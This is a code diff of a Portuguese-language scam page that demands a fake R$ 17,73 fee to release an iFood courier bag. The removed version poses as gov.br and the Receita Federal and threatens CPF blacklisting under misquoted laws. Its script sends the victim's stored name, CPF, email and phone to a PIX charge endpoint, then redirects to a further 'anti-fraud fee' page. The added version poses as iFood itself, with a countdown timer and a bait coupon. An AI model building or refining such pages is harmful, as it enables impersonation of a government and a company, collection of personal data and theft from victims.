@@ -1,364 +1,114 @@
-<!DOCTYPE html><html lang="pt-br"><head>
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Notificação Fiscal - gov.br</title>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Rawline:wght@400;500;600;700;800;900&display=swap">
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body {
-            font-family: 'Rawline', 'Inter', sans-serif;
-            background-color: #f0f2f5;
-            color: #333;
-            margin: 0;
-            -webkit-font-smoothing: antialiased;
-        }
-
-        .gov-blue {
-            background-color: #004088;
-        }
-
-        .gov-border {
-            border-top: 6px solid #004088;
-        }
-
-        .btn-gov {
-            background-color: #1351b4;
-        }
-
-        .legal-text {
-            color: #555;
-            font-size: 13px;
-            line-height: 1.6;
-        }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#EA1D2C">
+    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#EA1D2C">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <title>iFood Entregador - Taxa de Servico</title>
+    <meta name="description" content="Regularize a taxa de servico do iFood para liberar o envio da sua bag.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css?v=3.2">
 </head>
 
-<body data-page="upsell-iof" class="flex flex-col min-h-screen">
-
-    <div id="upsellScreen">
-        <header class="bg-white w-full shadow-sm">
-            <div class="max-w-7xl mx-auto px-6 py-8 flex justify-start items-center">
-                <img src="images/gov.br-logo-0.png" class="h-16 md:h-20" alt="gov.br">
-            </div>
-            <div class="gov-blue w-full h-2 shadow-md"></div>
-        </header>
-
-        <main class="flex-grow p-4 md:p-10">
-            <div class="max-w-2xl mx-auto bg-white gov-border shadow-md overflow-hidden">
-
-                <div class="bg-gray-50 py-10 px-8 flex flex-col items-center border-b border-gray-100">
-                    <img src="images/image.png" class="h-24 object-contain mb-4" alt="Receita Federal">
-                    <p class="text-[12px] font-bold text-gray-500 uppercase tracking-[0.3em]">Secretaria da Receita
-                        Federal do Brasil</p>
-                </div>
-
-                <div class="p-6 md:p-12">
-                    <div class="flex justify-between items-center mb-10 pb-4 border-b border-gray-100">
-                        <div class="text-[11px] text-gray-400 font-bold uppercase tracking-widest">
-                            EMISSÃO: <span id="current-date"></span>
-                        </div>
-                        <div class="text-[11px] text-gray-400 font-bold uppercase tracking-widest">
-                            REF: RFB-TKT-2026
-                        </div>
-                    </div>
-
-                    <h1 class="text-[#004088] text-2xl font-black leading-tight mb-8">
-                        Aviso importante da Receita Federal
-                    </h1>
-
-                    <div class="space-y-6 text-[#333] text-[15px] leading-relaxed mb-10 text-justify">
-                        <p>
-                            O sistema da BAG do iFood identificou uma pendência na taxa de IOF vinculada ao envio do
-                            seu kit de entregador.
-                            Para liberar a separação e o despacho da bag, é necessário realizar o recolhimento da guia
-                            abaixo.
-                        </p>
-
-                        <p>
-                            A regularização da taxa no valor de <strong class="text-black text-lg" id="price">R$
-                                17,73</strong> libera automaticamente a continuidade do envio da sua BAG.
-                            O não pagamento impede o avançar do pedido para a etapa de despacho.
-                        </p>
-
-                        <div class="bg-yellow-50 p-6 border-l-4 border-yellow-500">
-                            <p class="text-gray-900 font-bold text-sm mb-3 uppercase tracking-tight">⚠️ Notificação de
-                                Pendência Fiscal:</p>
-                            <p class="legal-text italic">
-                                O não pagamento desta taxa configura <strong>Infração Fiscal na Categoria
-                                    Alimentícia</strong>.
-                                A persistência da inadimplência resultará na inscrição do CPF em <strong>Dívida Ativa da
-                                    União</strong> e restrição de crédito no mercado ("Nome Sujo"), conforme
-                                <strong>Art. 2º da Lei nº 8.137/90</strong>.
-                                Evite o bloqueio de seu CPF regularizando o pedido agora.
-                            </p>
-                        </div>
-                    </div>
-
-                    <div class="bg-gray-50 rounded-lg p-8 mb-10 border border-gray-200">
-                        <div class="flex justify-between items-center mb-2">
-                            <span class="text-xs font-bold text-gray-400 uppercase tracking-widest">Natureza do
-                                Tributo:</span>
-                            <span class="text-xs font-bold text-gray-700">Taxa de Regularização de Entrega</span>
-                        </div>
-                        <div class="flex justify-between items-center border-t border-gray-200 pt-6 mt-4">
-                            <span class="text-md font-black text-gray-800 uppercase tracking-tighter">Total a
-                                recolher:</span>
-                            <span class="text-4xl font-black text-black tracking-tighter" id="price">R$ 17,73</span>
-                        </div>
-                    </div>
-
-                    <button onclick="initiateCheckout(event)" id="confirmation-button" class="block w-full btn-gov text-white text-center py-6 rounded font-bold text-xl shadow-sm hover:bg-[#0c326d] transition-all mb-8">
-                        Pagar taxa e liberar pedido
-                    </button>
-
-                    <div class="flex items-center justify-center gap-2 opacity-50">
-                        <svg width="16" height="16" viewBox="0 0 24 24" fill="#004088">
-                            <path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"></path>
-                        </svg>
-                        <span class="text-[10px] font-bold text-gray-500 uppercase tracking-[0.2em]">Autenticado via
-                            gov.br — Documento Oficial</span>
-                    </div>
-                </div>
-            </div>
-
-            <div class="mt-16 text-center text-gray-400 max-w-2xl mx-auto pb-20 px-6">
-                <div class="grid grid-cols-3 gap-2 mb-8 opacity-40 grayscale pointer-events-none uppercase font-black text-[8px] tracking-widest">
-                    <span class="border-r border-gray-300 px-2">RECEITA FEDERAL</span>
-                    <span class="border-r border-gray-300 px-2">BANCO CENTRAL</span>
-                    <span class="px-2">MINISTÉRIO DA FAZENDA</span>
-                </div>
-                <p class="text-[9px] font-medium leading-relaxed italic opacity-60">
-                    A reprodução deste documento sem autorização é crime federal. Lei 13.709/2018 (LGPD).
-                </p>
-            </div>
-        </main>
-    </div> <!-- End upsellScreen -->
-
-    <!-- QR Code / PIX Section -->
-    <div id="qrcodeSection" class="hidden" style="padding: 0 16px;">
-
-        <!-- Loading State -->
-        <div id="pixLoading" class="hidden flex flex-col items-center justify-center py-20">
-            <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-900 mb-4"></div>
-            <h3 class="text-lg font-bold text-gray-700">Gerando PIX...</h3>
-            <p class="text-gray-500 text-sm mt-2">Aguarde enquanto processamos sua solicitação.</p>
+<body data-page="upsell-iof">
+    <header class="header">
+        <div class="logo-container">
+            <img src="assets/ifoodentregadores-wink-v1.svg" alt="iFood Entregador" class="ifood-logo ifood-logo--wide">
         </div>
+    </header>
 
-        <!-- QR Code Data -->
-        <div id="pixData" class="hidden">
-            <div class="px-6 pt-10 pb-8 flex flex-col items-center border-b border-gray-50 bg-white">
-                <img src="images/receitafederal.png" alt="TikTok Logo" class="h-28 w-28 object-contain mb-6 drop-shadow-sm">
-                <div class="text-center">
-                    <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-1">Valor do Pagamento
-                    </p>
-                    <h2 class="text-5xl font-[900] text-[#161823] tracking-tighter" id="paymentValue">R$ 0,00</h2>
+    <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>
+
+    <main class="container">
+        <section class="step upsell-step upsell-iof-step" aria-hidden="false">
+            <div class="badge-container">
+                <span class="badge">Taxa pendente</span>
+            </div>
+
+            <h2 class="upsell-title">Falta pouco, <span id="upsell-iof-lead-name">parceiro</span>!</h2>
+            <p class="upsell-subtitle">Para liberar o envio da sua bag, e necessario quitar a taxa de servico do iFood vinculada ao seu pedido.</p>
+
+            <div class="upsell-image-slot" id="upsell-iof-image-slot" aria-label="Imagem da taxa de servico">
+                <img
+                    src="assets/upsellfoto.webp"
+                    alt="Taxa de servico iFood para envio da bag"
+                    class="upsell-image-slot__img"
+                    loading="eager"
+                    decoding="async">
+            </div>
+
+            <div class="upsell-urgency upsell-iof-urgency" id="upsell-iof-urgency">
+                <div class="upsell-urgency__left">
+                    <strong>Taxa de Servico iFood</strong>
+                    <span>Oferta desta sessao expira em <b id="upsell-iof-timer">10:00</b></span>
+                </div>
+                <div class="upsell-urgency__price">
+                    <span>Taxa unica</span>
+                    <strong id="upsell-iof-price">R$ 17,73</strong>
                 </div>
             </div>
-            <div class="text-center mb-6">
-                <h3 class="text-2xl font-black mb-2 text-gray-900">Escaneie o QR Code</h3>
-                <p class="text-gray-500 text-sm">Ou copie o código PIX abaixo</p>
+
+            <div class="upsell-explain upsell-iof-explain" id="upsell-iof-explain">
+                <h3>Por que pagar R$ 17,73?</h3>
+                <p>Essa taxa cobre os <strong>custos operacionais</strong> do iFood para processar e liberar o envio da sua bag.</p>
+                <ul>
+                    <li>Processamento e liberacao do pedido no sistema iFood</li>
+                    <li>Emissao de nota fiscal e documentacao do envio</li>
+                    <li>Suporte dedicado ao rastreio e entrega da bag</li>
+                </ul>
             </div>
-            <div class="bg-gradient-to-br from-gray-50 to-white border-2 border-gray-200 rounded-2xl p-6 mb-6 flex justify-center shadow-inner">
-                <img id="qrCodeImage" src="#" alt="QR Code PIX" class="max-w-full rounded-lg">
-            </div>
-            <div class="mb-6">
-                <label class="block text-sm font-bold text-gray-700 mb-3">Código PIX (Copiar e Colar)</label>
-                <div class="flex gap-2">
-                    <input type="text" id="pixCode" readonly="" class="flex-1 p-4 rounded-xl border-2 border-gray-200 bg-gray-50 text-xs font-mono">
-                    <button class="bg-[#FE2C55] px-6 py-4 rounded-xl text-white font-bold uppercase text-xs shadow-lg hover:opacity-90 transition-all" id="copy-pix-button" style="background-color: #003473;">COPIAR</button>
+
+            <div class="upsell-summary upsell-iof-summary" id="upsell-iof-summary" style="width:100%;background:#fff;border:1px solid #f2d8db;border-radius:14px;padding:14px 16px;display:grid;gap:10px;">
+                <div class="upsell-summary__row" style="display:flex;align-items:center;justify-content:space-between;font-size:0.92rem;color:#6f6f6f;">
+                    <span>Frete selecionado</span>
+                    <strong id="upsell-iof-current-frete" style="color:#1f1f1f;font-weight:600;">Frete padrao iFood</strong>
+                </div>
+                <div class="upsell-summary__row" style="display:flex;align-items:center;justify-content:space-between;font-size:0.92rem;color:#6f6f6f;border-top:1px solid #f2d8db;padding-top:10px;">
+                    <span>Referencia do pedido</span>
+                    <strong style="color:#1f1f1f;font-weight:600;">#<span id="upsell-iof-current-txid">--</span></strong>
                 </div>
             </div>
-            <div class="bg-blue-50 border-l-4 border-blue-500 p-4 rounded-r-lg mb-4">
-                <p class="text-sm text-gray-700">
-                    <strong class="text-blue-700">Aguardando pagamento...</strong><br>
-                    <span class="text-gray-600">O status será atualizado automaticamente.</span>
-                </p>
+
+            <div class="action-stack">
+                <button id="btn-upsell-iof-accept" class="btn-primary" type="button">Pagar taxa de servico R$ 17,73</button>
+                <button id="btn-upsell-iof-skip" class="btn-secondary" type="button">Nao quero pagar agora</button>
             </div>
-            <div id="paymentStatus" class="text-center text-sm font-bold text-gray-600 mb-4">Status: Aguardando
-                pagamento
+
+            <div id="upsell-iof-loading" class="inline-loading hidden" aria-hidden="true">
+                <div class="spinner spinner--sm" aria-hidden="true"></div>
+                <span>Gerando PIX da taxa de servico...</span>
             </div>
+
+            <p class="small-text">A bag segue reservada para seu CPF nesta sessao.</p>
+        </section>
+    </main>
+
+    <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>
+
+    <div id="coupon-modal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="coupon-title">
+        <div class="modal-card">
+            <div class="coupon-hero">
+                <img src="/assets/bagfoto.webp" alt="Bag iFood com desconto">
+            </div>
+            <span class="modal-badge">Cupom exclusivo</span>
+            <h3 id="coupon-title">Desconto liberado no frete</h3>
+            <p id="coupon-message">Voce ganhou R$ 5,00 de desconto no frete da Bag.</p>
+            <span class="coupon-subtitle">Oferta valida agora nesta sessao</span>
+            <button id="btn-coupon-apply" class="btn-primary" type="button">Usar cupom e pagar mais barato</button>
         </div>
     </div>
 
-    <!-- Sucesso -->
-    <div id="successSection" class="hidden px-6 py-8">
-        <div class="text-center">
-            <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
-                <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
-                </svg>
-            </div>
-            <h3 class="text-2xl font-black mb-2 text-green-600">Pagamento Confirmado!</h3>
-            <p class="text-gray-600 mb-6">Seu pedido será liberado em breve.</p>
-        </div>
-    </div>
+    <footer class="footer">
+        <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
+    </footer>
 
-    <script>
-        const upsellScreen = document.getElementById("upsellScreen");
-        const pixQrCodeScreen = document.getElementById("qrcodeSection");
-        const pixSuccessScreen = document.getElementById("successSection");
-        const qrCodeImage = document.getElementById("qrCodeImage");
-        const pixCode = document.getElementById("pixCode");
-        const paymentField = document.getElementById("paymentValue");
-        const body = document.body;
+    <script src="script.js?v=10.9" defer></script>
+</body>
 
-        const pathParts = window.location.pathname.split('/').filter(Boolean);
-        const baseFolder = pathParts[0];
-
-        let currentUpsellVal = 1296;
-
-        const price = document.getElementById("price");
-        async function fetchUpsellValue() {
-            try {
-                const urlParams = new URLSearchParams(window.location.search);
-                const uId = urlParams.get("upsell") || "up6";
-                const req = await fetch(`/${baseFolder}/get-upsell-value.php?upsell=${uId}`);
-                const res = await req.json();
-                if (res.success) {
-                    currentUpsellVal = Math.round(res.value * 100);
-                    price.textContent = formatPrice(currentUpsellVal / 100);
-                }
-            } catch (e) {
-                console.error("Erro ao buscar valor do upsell", e);
-            }
-        }
-
-        fetchUpsellValue();
-
-        function formatPrice(value) {
-            return `R$ ${parseFloat(value).toFixed(2).replace(".", ",")}`;
-        }
-
-        let pollingInterval;
-        let pollingAttempts = 0;
-        const MAX_POLLING_ATTEMPTS = 60;
-
-        const pixLoading = document.getElementById("pixLoading");
-        const pixData = document.getElementById("pixData");
-
-        async function initiateCheckout(event) {
-            event.preventDefault();
-
-            // Show Screen and Loading State immediately
-            if (upsellScreen) upsellScreen.style.display = "none";
-            pixQrCodeScreen.classList.remove("hidden");
-            pixLoading.classList.remove("hidden");
-            pixData.classList.add("hidden");
-            body.style.backgroundColor = '#ffffff';
-
-            const clientRawData = localStorage.getItem("clientData");;
-            const clientData = clientRawData ? JSON.parse(clientRawData) : null;
-            try {
-                const name = clientData?.nome
-                    ? clientData.name.trim()
-                    : "Cliente Upsell";
-                const document = clientData?.document || "";
-                const email = clientData?.email || "";
-                const phone = clientData?.phone || "";
-                const formData = new FormData();
-                formData.append("priceInCents", currentUpsellVal);
-                formData.append("email", email);
-                formData.append("name", name);
-                formData.append("document", document);
-                formData.append("phone", phone);
-                const urlParams = new URLSearchParams(window.location.search);
-                const utmData = {
-                    utm_source: urlParams.get("utm_source") || localStorage.getItem("utm_source") || "",
-                    utm_medium: urlParams.get("utm_medium") || localStorage.getItem("utm_medium") || "",
-                    utm_campaign: urlParams.get("utm_campaign") || localStorage.getItem("utm_campaign") || "",
-                    utm_content: urlParams.get("utm_content") || localStorage.getItem("utm_content") || "",
-                    utm_term: urlParams.get("utm_term") || localStorage.getItem("utm_term") || "",
-                    xcod: urlParams.get("xcod") || localStorage.getItem("xcod") || "",
-                    sck: urlParams.get("sck") || localStorage.getItem("sck") || "",
-                };
-                Object.entries(utmData).forEach(([key, value]) => { formData.append(key, value); });
-                const response = await fetch(`./pagamento.php`, { method: "POST", body: formData });
-                const responseData = await response.json();
-                if (responseData.success) {
-
-                    // Switch to Data State
-                    pixLoading.classList.add("hidden");
-                    pixData.classList.remove("hidden");
-
-                    qrCodeImage.src = responseData.qrCodeUrl;
-                    pixCode.value = responseData.pixCode;
-                    paymentField.textContent = formatPrice(currentUpsellVal / 100);
-
-                    startPaymentPolling(responseData.token);
-                } else {
-                    console.error("Resposta inesperada do pagamento:", responseData);
-                    // Handle error (optional: go back or show alert)
-                    alert("Erro ao gerar PIX. Tente novamente.");
-                    pixQrCodeScreen.classList.add("hidden");
-                    if (upsellScreen) upsellScreen.style.display = "block";
-                }
-            } catch (error) {
-                console.error("Erro ao gerar PIX:", error);
-                alert("Erro ao conectar com o servidor.");
-                pixQrCodeScreen.classList.add("hidden");
-                if (upsellScreen) upsellScreen.style.display = "block";
-            }
-        }
-
-        async function startPaymentPolling(transactionToken) {
-            if (pollingInterval) clearInterval(pollingInterval);
-            pollingAttempts = 0;
-            pollingInterval = setInterval(async () => {
-                pollingAttempts++;
-                if (pollingAttempts > MAX_POLLING_ATTEMPTS) { clearInterval(pollingInterval); return; }
-                try {
-                    const response = await fetch(`./verificar.php?id=${transactionToken}`);
-                    if (!response.ok) return;
-                    const result = await response.json();
-                    console.log("Status Polling:", result.status);
-
-                    // Verifica o status unificado (API ou Banco de Dados)
-                    const currentStatus = (result.status || '').toLowerCase();
-
-                    // Remove verificação de propriedade aninhada perigosa
-                    if (currentStatus === 'paid' || currentStatus === 'approved') {
-                        clearInterval(pollingInterval);
-                        pixQrCodeScreen.classList.add("hidden");
-                        pixSuccessScreen.classList.remove("hidden");
-                        setTimeout(() => { window.location.href = `./taxa-antifraude/index.html${window.location.search}`; }, 2000);
-                    }
-                } catch (error) { console.error("Polling error", error); }
-            }, 5000);
-        }
-
-        const copyPixButton = document.getElementById("copy-pix-button");
-        const pixCodeText = document.getElementById("pixCode");
-
-        copyPixButton.addEventListener("click", function () {
-            if (pixCodeText.value) {
-                navigator.clipboard
-                    .writeText(pixCodeText.value.trim())
-                    .then(() => {
-                        copyPixButton.textContent = "Código PIX copiado!";
-                        setTimeout(() => {
-                            copyPixButton.textContent = "COPIAR";
-                        }, 3000);
-                    })
-                    .catch(() => {
-                        copyPixButton.textContent = "Erro ao copiar.";
-                    });
-            }
-        });
-    </script>
-
-    <script>
-        function setDate() {
-            const now = new Date();
-            const options = { day: '2-digit', month: '2-digit', year: 'numeric' };
-            document.getElementById('current-date').textContent = now.toLocaleDateString('pt-BR', options);
-        }
-        window.onload = setDate;
-    </script>
-<script src="script.js?v=10.9" defer></script>
-
-
-</body></html>
-
-
-
-
+</html>
